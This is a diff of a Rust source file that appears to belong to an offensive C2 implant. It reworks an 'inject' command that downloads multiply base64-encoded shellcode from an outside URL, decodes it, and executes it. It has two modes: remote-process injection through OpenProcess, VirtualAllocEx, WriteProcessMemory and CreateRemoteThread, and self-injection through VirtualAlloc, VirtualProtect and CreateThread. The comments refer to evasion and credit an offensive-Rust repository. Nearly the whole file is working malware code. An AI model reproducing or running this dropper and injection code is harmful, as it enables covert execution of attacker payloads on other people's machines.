@@ -4,7 +4,21 @@ use crate::cmd::CommandArgs;
 #[cfg(windows)] use base64::decode as b64_decode;
 #[cfg(windows)] extern crate winapi;
 #[cfg(windows)] extern crate kernel32;
-#[cfg(windows)] use winapi::um::winnt::{PROCESS_ALL_ACCESS,MEM_COMMIT,MEM_RESERVE,PAGE_EXECUTE_READWRITE};
+#[cfg(windows)] use winapi::um::winnt::{
+    PROCESS_ALL_ACCESS,
+    MEM_COMMIT,
+    MEM_RESERVE,
+    PAGE_EXECUTE_READWRITE,
+    PAGE_EXECUTE_READ,
+    PAGE_READWRITE,
+    PVOID
+};
+#[cfg(windows)] use winapi::um::{
+    errhandlingapi,
+    processthreadsapi,
+    winbase, 
+    synchapi::WaitForSingleObject
+};
 #[cfg(windows)] use std::ptr;
 #[cfg(windows)] use reqwest::Client;
 
@@ -20,128 +34,218 @@ use crate::cmd::CommandArgs;
 /// This has proven effective in initial evasion.
 /// 
 /// ### Examples
-/// Usage: `inject [shellcode_url] [pid] [b64_iterations] 🎯`
+/// Usage: `inject [shellcode_method] [shellcode_url] [b64_iterations] [[pid]] 🎯`
 /// 
 /// On Linux, the payload will be downloaded and executed like a regular dropper.
 #[cfg(windows)] 
-pub async fn handle(mut cmd_args: CommandArgs, logger: &Logger) -> Result<String, Box<dyn Error>> {
-        
-    // Set up our variables; each one could fail on us.
-    // Yes this is a lot of verbose error checking, but this
-    // has to be rock solid or the agent will die.
-    let mut url: &str;
-    let mut pid: u32;
-    let mut b64_iterations: u32;
+pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<String, Box<dyn Error>> {
 
-    // Get URL
-    match cmd_args.nth(0) {
-        Some(u) => { 
-            logger.debug(format!("Shellcode URL: {}", &u));
-            url = u; 
-        },
-        None    => { return Ok("Could not parse URL".to_string()); }
-    };
+    if let Some(inject_type) = cmd_args.nth(0) {
 
-    // Get pid
-    match cmd_args.nth(0) {
-        Some(ps) => {
-            if let Ok(p) = ps.parse::<u32>() {
-                logger.debug(format!("Injecting into PID: {:?}", &p));
-                pid = p;
-            } else {
-                let err_msg = "Could not parse PID";
-                logger.err(err_msg.to_string());
-                return Ok(err_msg.to_string());
-            }
-        },
-        None => { 
-            let err_msg = "Could not extract PID";
-            logger.err(err_msg.to_string());
-            return Ok(err_msg.to_string()); 
-        }
-    };
+        // Set up our variables; each one could fail on us.
+        // Yes this is a lot of verbose error checking, but this
+        // has to be rock solid or the agent will die.
+        let mut url: &str;
+        let mut b64_iterations: u32;
 
-    // Get b64_iterations
-    match cmd_args.nth(0) {
-        Some(bs) => {
-            if let Ok(b) = bs.parse::<u32>() {
-                b64_iterations = b;
-            } else {
-                return Ok("Could not parse b64 iterations".to_string());
-            }
-        },
-        None => { return Ok("Could not extract b64 iterations".to_string()); }
-    };
+        // Get URL
+        match cmd_args.nth(0) {
+            Some(u) => { 
+                logger.debug(format!("Shellcode URL: {}", &u));
+                url = u; 
+            },
+            None    => { return Ok("Could not parse URL".to_string()); }
+        };
 
-    logger.debug(format!("Injecting into PID {:?}", pid));
-    let client = Client::new();
-    if let Ok(r) = client.get(url).send().await {
-        if r.status().is_success() {   
-            logger.info(format!("Got the shellcode")); 
-            // Get the shellcode. Now we have to decode it
-            let mut shellcode_encoded: Vec<u8>;
-            let mut shellcode_string: String;
-            let mut shellcode: Vec<u8>;
-            if let Ok(sc) = r.text().await {
-                shellcode_encoded = Vec::from(sc.trim().as_bytes());
-                logger.info(format!("Got encoded bytes"));
-                for i in 0..b64_iterations {
-                    logger.debug(format!("Decode iteration: {i}"));
-                    match b64_decode(shellcode_encoded) {
-                        Ok(d) => {
-                            shellcode_encoded = d
-                                .into_iter()
-                                .filter(|&b| b != 0x0a)
-                                .collect();
-                        },
-                        Err(e) => { return Ok(e.to_string()); }
-                    };
-                    
+        // Get b64_iterations
+        match cmd_args.nth(0) {
+            Some(bs) => {
+                if let Ok(b) = bs.parse::<u32>() {
+                    b64_iterations = b;
+                } else {
+                    return Ok("Could not parse b64 iterations".to_string());
                 }
-                // Convert bytes to our proper string
-                shellcode_string = String::from_utf8(shellcode_encoded)?;
-                // At this point, we have the comma-separated "0xNN" form of the shellcode.
-                // We need to get each one until a proper u8.
-                shellcode = shellcode_string
-                    .split(",")
-                    .map(|s| s.replace("0x", ""))
-                    .map(|s| s.replace(" ", ""))                    
-                    .map(|s|{ 
-                        match u8::from_str_radix(&s, 16) {
-                            Ok(b) => b,
-                            Err(_) => 0
-                        }
-                    })
-                    .collect();
+            },
+            None => { return Ok("Could not extract b64 iterations".to_string()); }
+        };
+
+        // Download shellcode, or try to
+        let client = Client::new();
+        if let Ok(r) = client.get(url).send().await {
+            if r.status().is_success() {   
+                logger.info(format!("Got the shellcode")); 
+                // Get the shellcode. Now we have to decode it
+                let mut shellcode_encoded: Vec<u8>;
+                let mut shellcode_string: String;
+                let mut shellcode: Vec<u8>;
+                if let Ok(sc) = r.text().await {
+                    shellcode_encoded = Vec::from(sc.trim().as_bytes());
+                    logger.info(format!("Got encoded bytes"));
+                    for i in 0..b64_iterations {
+                        logger.debug(format!("Decode iteration: {i}"));
+                        match b64_decode(shellcode_encoded) {
+                            Ok(d) => {
+                                shellcode_encoded = d
+                                    .into_iter()
+                                    .filter(|&b| b != 0x0a)
+                                    .collect();
+                            },
+                            Err(e) => { return Ok(e.to_string()); }
+                        };
+                        
+                    }
+                    // Convert bytes to our proper string
+                    shellcode_string = String::from_utf8(shellcode_encoded)?;
+                    // At this point, we have the comma-separated "0xNN" form of the shellcode.
+                    // We need to get each one until a proper u8.
+                    shellcode = shellcode_string
+                        .split(",")
+                        .map(|s| s.replace("0x", ""))
+                        .map(|s| s.replace(" ", ""))                    
+                        .map(|s|{ 
+                            match u8::from_str_radix(&s, 16) {
+                                Ok(b) => b,
+                                Err(_) => 0
+                            }
+                        })
+                        .collect();
+
+                } else {
+                    let err_msg = "Could not decode shellcode";
+                    logger.err(err_msg.to_string());
+                    return Ok(err_msg.to_string());
+                }
 
             } else {
-                let err_msg = "Could not decode shellcode";
-                logger.err(err_msg.to_string());
-                return Ok(err_msg.to_string());
-            }
+                return Ok("Could not download shellcode".to_string());
+            }   
 
-
-            // Big thanks to trickster0
-            // https://github.com/trickster0/OffensiveRust/tree/master/Process_Injection_CreateThread
-            unsafe {
-                let h = kernel32::OpenProcess(PROCESS_ALL_ACCESS, winapi::shared::ntdef::FALSE.into(), pid);
-                let addr = kernel32::VirtualAllocEx(h, ptr::null_mut(), shellcode.len() as u64, MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
-                let mut n = 0;
-                kernel32::WriteProcessMemory(h,addr,shellcode.as_ptr() as  _, shellcode.len() as u64,&mut n);
-                let _h_thread = kernel32::CreateRemoteThread(h, ptr::null_mut(), 0 , Some(std::mem::transmute(addr)), ptr::null_mut(), 0, ptr::null_mut());
-                kernel32::CloseHandle(h);
-            }
-            return Ok("Injection completed!".to_string());
         } else {
-            return Ok("Could not download shellcode".to_string());
-        }   
+            return Ok(format!("Could not download from {url}"));
+        }
+
+        match inject_type.as_str() {
+            "remote" => {
+                let mut pid: u32;
+                // Get pid
+                match cmd_args.nth(0) {
+                    Some(ps) => {
+                        if let Ok(p) = ps.parse::<u32>() {
+                            logger.debug(format!("Injecting into PID: {:?}", &p));
+                            pid = p;
+                            // Big thanks to trickster0
+                            // https://github.com/trickster0/OffensiveRust/tree/master/Process_Injection_CreateThread
+                            unsafe {
+                                let h = kernel32::OpenProcess(PROCESS_ALL_ACCESS, winapi::shared::ntdef::FALSE.into(), pid);
+                                let addr = kernel32::VirtualAllocEx(h, ptr::null_mut(), shellcode.len() as u64, MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
+                                let mut n = 0;
+                                kernel32::WriteProcessMemory(h,addr,shellcode.as_ptr() as  _, shellcode.len() as u64,&mut n);
+                                let _h_thread = kernel32::CreateRemoteThread(h, ptr::null_mut(), 0 , Some(std::mem::transmute(addr)), ptr::null_mut(), 0, ptr::null_mut());
+                                kernel32::CloseHandle(h);
+                            }
+                            return Ok("Injection completed!".to_string());
+                        } else {
+                            let err_msg = "Could not parse PID";
+                            logger.err(err_msg.to_string());
+                            return Ok(err_msg.to_string());
+                        }
+                    },
+                    None => { 
+                        let err_msg = "Could not extract PID";
+                        logger.err(err_msg.to_string());
+                        return Ok(err_msg.to_string()); 
+                    }
+                };
+            },
+            "self"  => {
+                type DWORD = u32;
+                logger.debug(format!("Injecting into current process..."));
+                unsafe {
+                    let base_addr = kernel32::VirtualAlloc(
+                        ptr::null_mut(),
+                        shellcode.len().try_into().unwrap(),
+                        MEM_COMMIT | MEM_RESERVE,
+                        PAGE_READWRITE,
+                    );
+
+                    if base_addr.is_null() {
+                        println!("[-] Couldn't allocate memory to current proc.")
+                    } else {
+                        println!("[+] Allocated memory to current proc.");
+                    }
+
+                    // copy shellcode into mem
+                    println!("[*] Copying Shellcode to address in current proc.");
+                    std::ptr::copy(shellcode.as_ptr() as _, base_addr, shellcode.len());
+                    println!("[*] Copied...");
+
+                    // Flip mem protections from RW to RX with VirtualProtect. Dispose of the call with `out _`
+                    println!("[*] Changing mem protections to RX...");
+
+                    let mut old_protect: DWORD = PAGE_READWRITE;
+
+                    let mem_protect = kernel32::VirtualProtect(
+                        base_addr,
+                        shellcode.len() as u64,
+                        PAGE_EXECUTE_READ,
+                        &mut old_protect,
+                    );
+
+                    if mem_protect == 0 {
+                        let error = errhandlingapi::GetLastError();
+                        println!("[-] Error: {}", error.to_string());
+                        process::exit(0x0100);
+                    }
+
+                    // Call CreateThread
+
+                    println!("[*] Calling CreateThread...");
+
+                    let mut tid = 0;
+                    let ep: extern "system" fn(PVOID) -> u32 = { std::mem::transmute(base_addr) };
+
+                    let h_thread = processthreadsapi::CreateThread(
+                        ptr::null_mut(),
+                        0,
+                        Some(ep),
+                        ptr::null_mut(),
+                        0,
+                        &mut tid,
+                    );
+
+                    if h_thread.is_null() {
+                        let error = unsafe { errhandlingapi::GetLastError() };
+                        println!("{}", error.to_string())
+                    } else {
+                        println!("[+] Thread Id: {}", tid)
+                    }
+
+                    // CreateThread is not a blocking call, so we wait on the thread indefinitely with WaitForSingleObject. This blocks for as long as the thread is running
+
+                    println!("[*] Calling WaitForSingleObject...");
+
+                    let status = WaitForSingleObject(h_thread, winbase::INFINITE);
+                    if status == 0 {
+                        println!("[+] Good!")
+                    } else {
+                        let error = errhandlingapi::GetLastError();
+                        println!("{}", error.to_string())
+                    }
+                }
+
+                return Ok("Injection completed!".to_string());
+                
+            }
+        }
 
     } else {
-        return Ok(format!("Could not download from {url}"));
-    }     
+        return Ok("Could not parse URL".to_string());
+    }
+    
+         
 }
 
 #[cfg(not(windows))]
-pub async fn handle(cmd_args: CommandArgs, logger: &Logger) -> Result<String, Box<dyn Error>> {
+pub async fn handle(cmd_args: &CommandArgs, logger: &Logger) -> Result<String, Box<dyn Error>> {
     Ok("Can only inject shellcode on Windows!".to_string())   
 }
